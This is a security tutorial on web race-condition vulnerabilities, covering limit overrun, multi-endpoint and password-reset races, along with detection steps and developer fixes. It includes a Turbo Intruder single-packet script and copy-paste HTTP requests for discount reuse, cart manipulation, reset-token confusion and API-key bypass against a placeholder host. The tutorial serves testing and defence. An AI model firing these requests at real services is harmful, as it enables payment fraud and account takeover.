# Race conditions

Race conditions occur when an application processes multiple requests concurrently and doesn't properly handle collisions when those requests interact with the same data. The exploitable window (race window) is often milliseconds or less, when the application enters a temporary sub-state between "check" and "update" operations.

Impact ranges from bypassing rate limits and reusing one-time discounts to privilege escalation, payment fraud, and authentication bypass.

> Only test systems you own or are explicitly authorized to assess.

## What race conditions are (and why they're hard)
The core issue: an application transitions through states that are safe individually but unsafe when interleaved with concurrent operations.

Classic pattern (TOCTOU - Time Of Check To Time Of Use):
```text
Thread 1: check(balance >= 100) → TRUE
Thread 2: check(balance >= 100) → TRUE
Thread 1: deduct(100) → balance = 0
Thread 2: deduct(100) → balance = -100
```

The "race window" is the gap between the check and the state change, often a few milliseconds. During normal usage, requests are sequential enough that collisions don't happen, so the bug goes unnoticed until intentionally exploited.

## Types of race conditions (patterns you'll encounter)

### 1) Limit overrun (classic "use something twice")
Application enforces "one-time" or rate-limited behavior without atomic operations.

Common targets:
- Discount codes, gift cards, referral bonuses, promo credits
- CAPTCHA reuse
- Rate-limited endpoints (login, password reset, API calls)
- Withdrawal/transfer limits
- Voting/rating systems

Example flow (discount code):
```text
1. Check: has user applied code "SAVE20"?
2. Apply: reduce order total by 20%
3. Update: mark code as "used" in DB
```

Race exploit:
- Send 5 parallel requests to apply the same code.
- All 5 pass check (step 1) before any update (step 3).
- Result: 100% discount (5 × 20%).

### 2) Multi-endpoint race conditions (workflow bypass)
Exploiting race windows across different endpoints that touch the same session/state.

Example: shop checkout flow
```text
Endpoint A: POST /validate-payment → sets session['payment_validated'] = true
Endpoint B: POST /add-to-cart → adds items
Endpoint C: POST /confirm-order → checks session['payment_validated'], finalizes order
```

Attack:
- Request A validates payment for $10 cart.
- Before A completes, fire parallel requests to B (add expensive items) and C (confirm order).
- If timing is right, C sees `payment_validated=true` but the cart now contains $1000 of items.

### 3) Single-endpoint race conditions (state confusion)
Sending parallel requests to the same endpoint with different parameters, causing state variables to collide.

Example: password reset token confusion
```text
POST /reset-password
{
  "username": "attacker"
}

Server logic:
session['reset_user'] = request.username
token = generate_token()
session['reset_token'] = token
send_email(session['reset_user'], session['reset_token'])
```

Attack:
- Send two parallel POST requests from the same session:
  - Request 1: `{"username":"attacker"}`
  - Request 2: `{"username":"victim"}`

Possible outcome (depending on interleaving):
```text
session['reset_user'] = 'victim'
session['reset_token'] = '1234'
email sent to: attacker@example.com with token '1234'
```

Attacker gets a valid reset token for the victim's account.

### 4) Partial construction race conditions (uninitialized state)
Objects created in multiple steps have a window where they exist but security-critical fields are uninitialized (NULL, empty string, default values).

Example: user registration with API key
```sql
-- Step 1
INSERT INTO users (username) VALUES ('newuser');
-- Step 2 (happens slightly later)
UPDATE users SET api_key = 'random_key_here' WHERE username = 'newuser';
```

During the race window, the user exists but `api_key` is NULL.

Attack idea:
- Register a new account.
- Immediately send parallel requests to an authenticated endpoint using an "empty" API key representation.

HTTP example:
```http
GET /api/user/info?username=newuser&api_key[]= HTTP/2
```

In some frameworks, `api_key[]=` results in `null` or `[]` server-side, which may match the uninitialized DB value during the race window.

### 5) Time-sensitive vulnerabilities (not classic races, but same technique)
When tokens/IDs are generated using weak randomness (timestamp-only), precise timing lets you predict or reuse values.

Example: password reset token = `hash(username + timestamp_seconds)`

Attack:
- Trigger two password resets for two different users at the exact same second.
- Both get the same token.
- Use your token to reset the other user's password.

## How to detect and exploit race conditions (practical workflow)

### Step 1: Identify collision candidates
Look for endpoints where:
- **Same data, different requests**: operations touch the same DB row, session variable, file, or account.
- **Security-critical state transitions**: login, payment, balance deduction, privilege changes, one-time tokens.
- **Rate limits or quotas**: any "you can only do this X times" logic.

Quick heuristics:
- Anything involving money, credits, discounts, refunds.
- MFA/2FA flows, password resets, email confirmations.
- Session-based state (role changes, cart, purchase flow).
- Async operations (emails, background jobs).

### Step 2: Benchmark normal behavior
Before racing, send requests **sequentially** and observe:
- Response status, body, headers.
- Side effects: emails sent, DB changes, balance updates.
- Response timing.

### Step 3: Send parallel requests (minimize jitter)
Use techniques that reduce network delay variance so requests arrive as close together as possible.

#### HTTP/2 single-packet attack (best)
Uses HTTP/2 request multiplexing to send 20-30 requests in a single TCP packet, completely neutralizing network jitter.

Burp Repeater (2023.9+):
- Group tabs (right-click → "Create tab group" or Ctrl/Cmd + drag).
- Select "Send group in parallel" (uses single-packet for HTTP/2).

Turbo Intruder (for more control):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )
    
    # Queue 20 identical requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # Fire them all in one packet
    engine.openGate('1')
```

#### HTTP/1.1 last-byte sync (fallback)
Send all request bytes except the final byte, then complete them all at once.

Burp Repeater automatically uses this technique for HTTP/1 when you select "Send group in parallel."

### Step 4: Look for deviations (clues)
Compare parallel results to sequential baseline:
- Different status codes (one 200, rest 429 or 400)
- Different response bodies (balances, error messages)
- Different side effects (multiple emails, different email content, DB shows wrong state)
- Timing differences

**Anything that differs is a clue.**

### Step 5: Prove the concept
- Remove noise (unnecessary requests).
- Increase success rate (adjust payload, number of requests, timing).
- Demonstrate impact (not just "it behaved weird" but "I got $X free credit" or "I bypassed MFA").

## Practical exploit examples (copy/paste starters)

### Discount code reuse
Sequential baseline:
```http
POST /apply-discount HTTP/2
Host: target.tld
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

code=SAVE20
```

Race attack (group 10 of these, send parallel).

### Multi-endpoint cart manipulation
Group these requests and send in parallel:
```http
POST /validate-payment HTTP/2
Host: target.tld
Cookie: session=...
Content-Type: application/json

{"cartId":"123"}
```

```http
POST /cart/add HTTP/2
Host: target.tld
Cookie: session=...
Content-Type: application/json

{"itemId":"expensive-thing","quantity":10}
```

```http
POST /confirm-order HTTP/2
Host: target.tld
Cookie: session=...
Content-Type: application/json

{"cartId":"123"}
```

### Single-endpoint password reset confusion
Send these in parallel from the same session:
```http
POST /reset-password HTTP/2
Host: target.tld
Cookie: session=abc123
Content-Type: application/json

{"username":"attacker@example.com"}
```

```http
POST /reset-password HTTP/2
Host: target.tld
Cookie: session=abc123
Content-Type: application/json

{"username":"victim@example.com"}
```

Check which email receives which token, and whether state got mixed.

### Partial construction API key bypass
Register user, then immediately race with:
```http
GET /api/user/data?user=newuser&api_key[]= HTTP/2
Host: target.tld
```

```http
GET /api/user/data?user=newuser&api_key= HTTP/2
Host: target.tld
```

```http
GET /api/user/data?user=newuser&api_key=null HTTP/2
Host: target.tld
```

One of these representations may match the uninitialized DB state.

### Time-sensitive token collision
Trigger password resets for two users as close together as possible:
```http
POST /reset-password HTTP/2
Host: target.tld
Content-Type: application/json

{"username":"user1@example.com"}
```

```http
POST /reset-password HTTP/2
Host: target.tld
Content-Type: application/json

{"username":"user2@example.com"}
```

If tokens are timestamp-based with only second granularity, both may get the same token.

## Common challenges and workarounds

### Challenge: Session-based locking (PHP default behavior)
PHP's native session handler processes one request per session at a time, making races impossible within the same session.

Workaround:
- Use different session cookies for each parallel request.
- Register multiple accounts and race across them.

### Challenge: Connection delays (front-end → back-end latency)
First request in a group takes longer (TCP handshake, TLS negotiation).

Workaround: "connection warming"
- Add a dummy request (e.g., `GET /` or harmless endpoint) to the start of your group.
- Use "Send group in sequence (single connection)" first to warm the connection.
- Then send your attack group in parallel on the warmed connection.

### Challenge: Endpoint-specific processing delays
One endpoint takes 200ms, another takes 20ms, so race windows don't align.

Workaround: abuse rate limits to introduce artificial server-side delay
- Send a burst of junk requests to trigger rate-limiting/throttling.
- This can cause the server to delay processing, effectively aligning your attack requests.

## Prevention (what developers should do)

### 1) Make state changes atomic (use DB transactions)
Bad:
```sql
SELECT balance FROM accounts WHERE user_id = 123;
-- (app checks balance >= 100)
UPDATE accounts SET balance = balance - 100 WHERE user_id = 123;
```

Good:
```sql
BEGIN TRANSACTION;
UPDATE accounts SET balance = balance - 100 WHERE user_id = 123 AND balance >= 100;
-- (returns 0 rows affected if balance was insufficient)
COMMIT;
```

Better (explicit locking):
```sql
BEGIN TRANSACTION;
SELECT balance FROM accounts WHERE user_id = 123 FOR UPDATE;
-- (app checks balance)
UPDATE accounts SET balance = balance - 100 WHERE user_id = 123;
COMMIT;
```

### 2) Use DB constraints for invariants
Example: discount codes should be single-use.

Table schema:
```sql
CREATE TABLE discount_usage (
  user_id INT NOT NULL,
  code VARCHAR(50) NOT NULL,
  used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  UNIQUE(user_id, code)
);
```

Application:
```sql
INSERT INTO discount_usage (user_id, code) VALUES (123, 'SAVE20');
-- This will fail on second attempt due to UNIQUE constraint
```

### 3) Avoid mixing state storage layers
Don't use session variables to "protect" database operations; the session write may happen after the DB write completes, introducing a race window.

Bad:
```python
if not session.get('used_code_SAVE20'):
    apply_discount(order)
    session['used_code_SAVE20'] = True
```

Good:
```python
try:
    db.discount_usage.insert({'user_id': user.id, 'code': 'SAVE20'})
    apply_discount(order)
except UniqueConstraintError:
    abort(400, "Code already used")
```

### 4) Eliminate sub-states in sensitive flows
Don't split critical checks and updates across multiple statements/requests.

Bad (multi-step MFA check):
```python
session['user_id'] = user.id
if user.mfa_enabled:
    session['mfa_required'] = True
    redirect('/mfa')
```

Race window: user is logged in but MFA not yet enforced.

Better:
```python
if user.mfa_enabled and not mfa_verified:
    redirect('/mfa')
else:
    session['user_id'] = user.id
    session['mfa_verified'] = True
```

### 5) Use idempotency keys for critical actions
For payments, refunds, credits, high-value state changes:
```http
POST /api/refund
Idempotency-Key: 7c4a8d09-...
Content-Type: application/json

{"orderId":123,"amount":50}
```

Server implementation:
```python
key = request.headers.get('Idempotency-Key')
if db.idempotency_log.exists(key):
    return cached_response(key)
    
result = process_refund(order_id, amount)
db.idempotency_log.insert(key, result)
return result
```

### 6) Session consistency (update variables atomically)
Bad (incremental session updates):
```python
session['cart_total'] = 100
# ...other code...
session['payment_validated'] = True
```

If another request reads session between these writes, it sees an inconsistent state.

Better:
```python
session.update({
    'cart_total': 100,
    'payment_validated': True
})
```

### 7) Test with concurrency in mind
Add integration tests that fire parallel requests and assert invariants:
- Balance never goes negative
- Discount applied exactly once
- Rate limits respected across concurrent requests

Example test pattern (pseudo-code):
```python
def test_discount_race():
    threads = [Thread(target=apply_discount, args=('SAVE20',)) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    usage_count = db.count("SELECT * FROM discount_usage WHERE code='SAVE20'")
    assert usage_count == 1
```
